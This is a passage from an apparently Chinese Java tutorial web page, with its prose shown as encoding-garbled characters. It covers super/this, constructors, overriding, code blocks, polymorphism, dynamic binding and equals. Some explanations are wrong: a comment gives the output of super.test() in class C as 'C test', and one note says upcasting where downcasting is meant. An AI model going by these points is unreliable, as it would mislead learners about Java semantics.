"></a>ç»ƒä¹ </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        String name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    String name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    String java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> nums=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//superå¯ä»¥è®¿é—®çš„æˆå‘˜ï¼ˆå±æ€§å’Œæ–¹æ³•ï¼‰</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-built_in">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//thiså¯ä»¥è®¿é—®çš„æˆå‘˜</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.nums);  <span class="hljs-comment">//100</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //é€’å½’</span><br>        <span class="hljs-built_in">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    String name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//superè®¿é—®æˆå‘˜</span><br>        System.out.println(<span class="hljs-built_in">super</span>.java); <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-built_in">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-built_in">super</span>.demo();<br>        <span class="hljs-comment">//thiså¯ä»¥è®¿é—®å“ªäº›æˆå‘˜</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-built_in">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="çˆ¶ç±»æ„é€ å™¨"><a href="#çˆ¶ç±»æ„é€ å™¨" class="headerlink" title="çˆ¶ç±»æ„é€ å™¨"></a>çˆ¶ç±»æ„é€ å™¨</h2><p>åˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œé»˜è®¤ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚æ„é€ å™¨ super( );</p><p>å¦‚æœçˆ¶ç±»æ²¡æœ‰æä¾›æ— å‚æ„é€ å™¨ï¼Œé¡»åœ¨å­ç±»æ„é€ å™¨ä¸­ç”¨ super å»çŸ¥é“ä½¿ç”¨çˆ¶ç±»å“ªä¸ªæ„é€ å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(å‚æ•°åˆ—è¡¨);<br>e.g.<br><span class="hljs-built_in">super</span>(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() å’Œ this() éƒ½åªèƒ½æ”¾åœ¨æ„é€ å™¨ç¬¬ä¸€è¡Œï¼Œå› æ­¤ä¸èƒ½å…±å­˜åœ¨åŒä¸€ä¸ªæ„é€ å™¨ï¼›</strong></p><p>3.çˆ¶ç±»æ„é€ å™¨çš„è°ƒç”¨ä¸é™äºç›´æ¥çˆ¶ç±»ï¼Œä¸€ç›´å¾€ä¸Šè¿½æº¯åˆ° Object ç±»ï¼ˆé¡¶çº§çˆ¶ç±»ï¼‰</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>ç”¨å¤„</p><p>a) å­ç±»å’Œçˆ¶ç±»å…·æœ‰åŒåå±æ€§å’Œæ–¹æ³•æ—¶ï¼Œ<strong>é»˜è®¤ä½¿ç”¨å­ç±»çš„åŒåå±æ€§å’Œæ–¹æ³•</strong>ã€‚è®¿é—®çˆ¶ç±»çš„å±æ€§æˆ–æ–¹æ³•å¿…é¡»é€šè¿‡ super æ¥è°ƒç”¨</p><p>b) super ä»£è¡¨çˆ¶ç±»å¯¹è±¡çš„å¼•ç”¨ï¼Œç”¨äºè®¿é—®çˆ¶ç±»å¯¹è±¡çš„å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨</p><p>è®¿é—®çˆ¶ç±»çš„å±æ€§ï¼ˆå—è®¿é—®ä¿®é¥°ç¬¦å½±å“ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.å±æ€§åï¼›<br></code></pre></td></tr></table></figure><p>è®¿é—®çˆ¶ç±»çš„æ–¹æ³•ï¼ˆå—è®¿é—®ä¿®é¥°ç¬¦å½±å“ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.æ–¹æ³•åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ï¼›<br></code></pre></td></tr></table></figure><p>è®¿é—®çˆ¶ç±»çš„æ„é€ å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ï¼›<br></code></pre></td></tr></table></figure><h1 id="æ–¹æ³•é‡å†™"><a href="#æ–¹æ³•é‡å†™" class="headerlink" title="æ–¹æ³•é‡å†™"></a>æ–¹æ³•é‡å†™</h1><p>å­ç±»å¯ä»¥é‡å†™æ–¹æ³•å’Œå±æ€§</p><h2 id="æ–¹æ³•é‡å†™ç‰¹ç‚¹"><a href="#æ–¹æ³•é‡å†™ç‰¹ç‚¹" class="headerlink" title="æ–¹æ³•é‡å†™ç‰¹ç‚¹"></a>æ–¹æ³•é‡å†™ç‰¹ç‚¹</h2><ul><li><p>ä¹Ÿç§°ä¸ºæ–¹æ³•è¦†ç›–</p></li><li><p>å­ç±»æ–¹æ³•çš„åç§°ã€å‚æ•°ã€ä¸çˆ¶ç±»å®Œå…¨ç›¸åŒ</p></li><li><p>è¿”å›ç±»å‹å’Œçˆ¶ç±»ä¸€æ ·ï¼Œæˆ–åˆ™æ˜¯çˆ¶ç±»è¿”å›ç±»å‹çš„å­ç±»ï¼Œæ¯”å¦‚çˆ¶ç±»è¿”å›ç±»å‹æ˜¯ Objectï¼Œå­ç±»è¿”å›æ–¹æ³•ç±»å‹æ˜¯ String</p></li><li><p>å­ç±»æ–¹æ³•ä¸èƒ½ç¼©å°çˆ¶ç±»æ–¹æ³•çš„è®¿é—®æƒé™</p></li></ul><h2 id="é‡è½½ä¸é‡å†™çš„åŒºåˆ«"><a href="#é‡è½½ä¸é‡å†™çš„åŒºåˆ«" class="headerlink" title="é‡è½½ä¸é‡å†™çš„åŒºåˆ«"></a>é‡è½½ä¸é‡å†™çš„åŒºåˆ«</h2><p><strong>é‡è½½</strong>ï¼š<strong>åŒä¸€ä¸ªç±»</strong>ï¼Œæ–¹æ³•åç›¸åŒï¼Œå‚æ•°ç±»å‹ã€ä¸ªæ•°æˆ–é¡ºåºä¸åŒï¼Œä¸è¿”å›å€¼å’Œä¿®é¥°ç¬¦æ— å…³</p><p><strong>é‡å†™</strong>ï¼š<strong>çˆ¶ç±»å’Œå­ç±»</strong>ä¸­ï¼Œæ–¹æ³•åã€å‚æ•°ç›¸åŒï¼Œå­ç±»è¿”å›ç±»å‹ä¸çˆ¶ç±»ä¸€æ ·æˆ–è€…æ˜¯å…¶å­ç±»ï¼Œå­ç±»ä¸èƒ½ç¼©å°çˆ¶ç±»çš„ç¼©å°è®¿é—®èŒƒå›´</p><h1 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h1><h2 id="é™æ€ä»£ç å—"><a href="#é™æ€ä»£ç å—" class="headerlink" title="é™æ€ä»£ç å—"></a>é™æ€ä»£ç å—</h2><p>å¯ä»¥å®šä¹‰å¤šä¸ªï¼Œä¸é™æ€å±æ€§åˆå§‹åŒ–ä¼˜å…ˆçº§ä¸€æ ·ï¼ŒæŒ‰ç…§å®šä¹‰é¡ºåºæ‰§è¡Œï¼Œéšç€ç±»çš„åŠ è½½è€Œæ‰§è¡Œï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰§è¡Œæ—¶æœºæ¯”æ™®é€šä»£ç å—æ—©</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="æ™®é€šä»£ç å—"><a href="#æ™®é€šä»£ç å—" class="headerlink" title="æ™®é€šä»£ç å—"></a>æ™®é€šä»£ç å—</h2><p>å¯ä»¥å®šä¹‰å¤šä¸ªï¼ŒæŒ‰ç…§å®šä¹‰é¡ºåºæ‰§è¡Œï¼Œéšç€å¯¹è±¡åˆ›å»ºè€Œæ‰§è¡Œï¼Œæé«˜æ„é€ å™¨ä»£ç å¤ç”¨æ€§ï¼Œæ¯æ¬¡åˆ›å»ºå¯¹è±¡éƒ½ä¼šæ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)è°ƒç”¨æœ¬ç±»æ™®é€šä»£ç å—</span><br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç±»ä»€ä¹ˆæ—¶å€™è¢«åŠ è½½"><a href="#ç±»ä»€ä¹ˆæ—¶å€™è¢«åŠ è½½" class="headerlink" title="ç±»ä»€ä¹ˆæ—¶å€™è¢«åŠ è½½"></a>ç±»ä»€ä¹ˆæ—¶å€™è¢«åŠ è½½</h2><ul><li><p>åˆ›å»ºå¯¹è±¡å®ä¾‹</p></li><li><p>åˆ›å»ºå­å¯¹è±¡å®ä¾‹ï¼Œçˆ¶ç±»ä¹Ÿä¼šè¢«åŠ è½½</p></li><li><p>ä½¿ç”¨ç±»çš„é™æ€æˆå‘˜æ—¶</p></li><li><p>ä½¿ç”¨å­ç±»é™æ€æˆå‘˜æ—¶ï¼Œçˆ¶ç±»ä¹Ÿä¼šè¢«åŠ è½½</p></li></ul><h2 id="åˆ›å»ºå¯¹è±¡æ—¶çš„è°ƒç”¨é¡ºåº"><a href="#åˆ›å»ºå¯¹è±¡æ—¶çš„è°ƒç”¨é¡ºåº" class="headerlink" title="åˆ›å»ºå¯¹è±¡æ—¶çš„è°ƒç”¨é¡ºåº"></a>åˆ›å»ºå¯¹è±¡æ—¶çš„è°ƒç”¨é¡ºåº</h2><ol><li>çˆ¶ç±»çš„é™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–</li><li>å­ç±»çš„é™æ€ä»£ç å—å’Œé™æ€å±æ€§åˆå§‹åŒ–</li><li>çˆ¶ç±»çš„æ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§åˆå§‹åŒ–</li><li>çˆ¶ç±»çš„æ„é€ æ–¹æ³•</li><li>å­ç±»çš„æ™®é€šä»£ç å—å’Œæ™®é€šå±æ€§åˆå§‹åŒ–</li><li>å­ç±»çš„æ„é€ æ–¹æ³•</li></ol><p><strong>é™æ€ä»£ç å—åªèƒ½è°ƒç”¨é™æ€æˆå‘˜ï¼Œæ™®é€šä»£ç å—å¯ä»¥è°ƒç”¨ä»»æ„æˆå‘˜</strong></p><h2 id="æ‰§è¡Œ-new-Test-ä¼šè¾“å‡ºä»€ä¹ˆ"><a href="#æ‰§è¡Œ-new-Test-ä¼šè¾“å‡ºä»€ä¹ˆ" class="headerlink" title="æ‰§è¡Œ new Test();ä¼šè¾“å‡ºä»€ä¹ˆ"></a>æ‰§è¡Œ new Test();ä¼šè¾“å‡ºä»€ä¹ˆ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.out.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Demoæ— å‚&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo1åˆå§‹åŒ–&quot;</span>);    <span class="hljs-comment">//ç¬¬ä¸‰æ­¥</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo2åˆå§‹åŒ–&quot;</span>); <span class="hljs-comment">//ç¬¬ä¸€æ­¥</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;staticæ‰§è¡Œ&quot;</span>); <span class="hljs-comment">//ç¬¬äºŒæ­¥</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.out.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Testæ— å‚&quot;</span>);   <span class="hljs-comment">//æœ€åä¸€æ­¥</span><br>    &#125;<br>&#125;<br>è¾“å‡ºï¼š<br>Demo2åˆå§‹åŒ–<br><span class="hljs-keyword">static</span>æ‰§è¡Œ<br>Demo1åˆå§‹åŒ–<br>Testæ— å‚<br></code></pre></td></tr></table></figure><h1 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h1><h2 id="å¤šæ€å‚æ•°"><a href="#å¤šæ€å‚æ•°" class="headerlink" title="å¤šæ€å‚æ•°"></a>å¤šæ€å‚æ•°</h2><p>å‚æ•°å®šä¹‰æˆçˆ¶ç±»ç±»å‹ï¼Œå°±å¯ä»¥ä¼ ä»»æ„å­ç±»ç±»å‹è¿›å»</p><h2 id="å‘ä¸Šè½¬å‹"><a href="#å‘ä¸Šè½¬å‹" class="headerlink" title="å‘ä¸Šè½¬å‹"></a>å‘ä¸Šè½¬å‹</h2><p><strong>aï¼‰</strong> è¯­æ³•ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">çˆ¶ç±»ç±»å‹å¼•ç”¨å<span class="hljs-operator">=</span>newå­ç±»ç±»å‹ï¼ˆï¼‰ï¼›<br></code></pre></td></tr></table></figure><p><strong>bï¼‰</strong> çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡</p><p><strong>cï¼‰</strong> ç¼–è¯‘ç±»å‹çœ‹å·¦è¾¹ï¼Œè¿è¡Œç±»å‹çœ‹å³è¾¹</p><p><strong>dï¼‰</strong> å¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­æ‰€æœ‰æˆå‘˜ï¼ˆå—è®¿é—®ä¿®é¥°ç¬¦å½±å“ï¼‰</p><p><strong>eï¼‰</strong>è°ƒç”¨çš„æ—¶å€™ï¼Œ<strong>å­ç±»æœ‰å°±ç”¨å­ç±»çš„æˆå‘˜ï¼Œæ²¡æœ‰å°±æ‰¾çˆ¶ç±»ï¼ˆå°±è¿‘åŸåˆ™ï¼‰</strong></p><p><strong>fï¼‰</strong>ä¸èƒ½è°ƒç”¨å­ç±»ä¸­ç‰¹æœ‰æˆå‘˜</p><h2 id="æ³¨æ„äº‹é¡¹-1"><a href="#æ³¨æ„äº‹é¡¹-1" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p><strong>aï¼‰</strong>å¤šæ€çš„å‰æï¼š<strong>è¿ä¸ªå¯¹è±¡ï¼ˆç±»ï¼‰å­˜åœ¨ç»§æ‰¿å…³ç³»</strong></p><p><strong>bï¼‰</strong>å±æ€§çš„å€¼çœ‹ç¼–è¯‘ç±»å‹</p><p><strong>cï¼‰</strong>æ–¹æ³•éƒ½çœ‹è¿è¡Œç±»å‹ï¼Œå±æ€§çœ‹ç¼–è¯‘ç±»å‹</p><p><strong>dï¼‰</strong> <strong>instanceof</strong> æ¯”è¾ƒæ“ä½œç¬¦ï¼Œç”¨äºåˆ¤æ–­å¯¹è±¡çš„è¿è¡Œç±»å‹æ˜¯å¦ä¸º XX ç±»å‹æˆ– XX ç±»å‹çš„å­ç±»å‹</p><p><strong>eï¼‰</strong>è¦è°ƒç”¨å­ç±»ä¸­çš„ç‰¹æœ‰æˆå‘˜è¦å‘ä¸Šè½¬å‹</p><h2 id="å¤šæ€æ•°ç»„"><a href="#å¤šæ€æ•°ç»„" class="headerlink" title="å¤šæ€æ•°ç»„"></a>å¤šæ€æ•°ç»„</h2><p>æ•°ç»„ç±»å‹ä¸ºçˆ¶ç±»ç±»å‹ï¼Œä¿å­˜å®é™…å…ƒç´ ä¸ºå­ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(b.count);<br>        b.display();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.count);<br>        a.display();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">200</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br>è¾“å‡ºï¼š<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="åŠ¨æ€ç»‘å®šæœºåˆ¶"><a href="#åŠ¨æ€ç»‘å®šæœºåˆ¶" class="headerlink" title="åŠ¨æ€ç»‘å®šæœºåˆ¶"></a>åŠ¨æ€ç»‘å®šæœºåˆ¶</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>       System.out.println(a.sum());<br>       System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>è¾“å‡ºï¼š<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.å½“è°ƒç”¨å¯¹è±¡æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šå’Œè¯¥å¯¹è±¡å†…å­˜åœ°å€&#x2F;è¿è¡Œç±»å‹ç»‘å®š</p><p>2.å½“è°ƒç”¨å¯¹è±¡å±æ€§æ—¶ï¼Œæ²¡æœ‰åŠ¨æ€ç»‘å®šæœºåˆ¶ï¼Œå°±è¿‘åŸåˆ™</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object æ˜¯æ‰€æœ‰å¯¹è±¡çš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯æ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥ä½¿ç”¨ Object é‡Œé¢çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">equals getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>åˆ¤æ–­åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹</p><p>åŸºæœ¬ç±»å‹åˆ¤æ–­<strong>å€¼</strong>ï¼Œå¼•ç”¨ç±»å‹åˆ¤æ–­<strong>åœ°å€</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>åªèƒ½åˆ¤æ–­å¼•ç”¨ç±»å‹ï¼Œé»˜è®¤åˆ¤æ–­åœ°å€æ˜¯å¦ç›¸ç­‰</strong></p><p>å­ç±»ä¸€èˆ¬ä¼šé‡å†™ equals æ–¹æ³•ï¼Œåˆ¤æ–­å†…å®¹æ˜¯å¦ç›¸ç­‰ï¼Œæ¯”å¦‚ Integerã€String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p1.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  Person p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p2.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  System.out.println(p1==p2); <span class="hljs-comment">//False</span><br>  System.out.println(p1.equals(p2));  <span class="hljs-comment">//False</span><br>  System.out.println(p1.name.equals(p2.name));    <span class="hljs-comment">//True</span><br>  System.out.println(p1.name==p2.name);   <span class="hljs-comment">//True</span><br>      <br>  String s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  String s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  System.out.println(s1==s2); <span class="hljs-comment">//False</span><br>  System.out.println(s1.equals(s2));  <span class="hljs-comment">//True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" 